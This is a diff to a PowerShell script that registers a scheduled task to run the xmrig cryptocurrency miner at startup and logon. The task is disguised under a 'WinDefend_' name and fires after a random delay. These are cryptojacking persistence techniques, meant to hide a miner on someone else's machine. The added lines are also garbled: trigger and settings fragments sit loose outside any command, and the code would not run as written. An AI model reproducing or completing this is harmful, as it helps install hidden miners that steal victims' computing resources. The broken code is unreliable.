@@ -108,12 +108,19 @@ try {
         -DontStopIfGoingOnBatteries `
         -MultipleInstances IgnoreNew
 
-    $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Min 2 -Max 5))
-    Register-ScheduledTask -TaskName "WinDefend_$((Get-Date).Ticks)" `
-        -Trigger $trigger `
-        -Action (New-ScheduledTaskAction -Execute "$minerHome\$minerBinary" -Argument "xmrig.exe") `
-        -Settings $taskSettings `
-        -Force | Out-Null
+    # $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Min 2 -Max 5))
+    $startupTrigger = New-ScheduledTaskTrigger -AtStartup
+    $startupTrigger.Delay = (New-TimeSpan -Minutes (Get-Random -Minimum 2 -Maximum 5))
+
+    $logonTrigger = New-ScheduledTaskTrigger -AtLogOn
+    $logonTrigger.Delay = (New-TimeSpan -Minutes (Get-Random -Minimum 2 -Maximum 5))
+
+    -Trigger $trigger `
+    $action = New-ScheduledTaskAction -Execute (Join-Path -Path $minerHome -ChildPath "xmrig.exe") `
+    -Settings $taskSettings `
+    -Force | Out-Null
+    Register-ScheduledTask -TaskName "WinDefend_$((Get-Date).Ticks)" -Action $action -Trigger @($startupTrigger, $logonTrigger) `
+
 }
 catch {
     Write-Warning "Scheduled task creation failed: $($_.Exception.Message)"
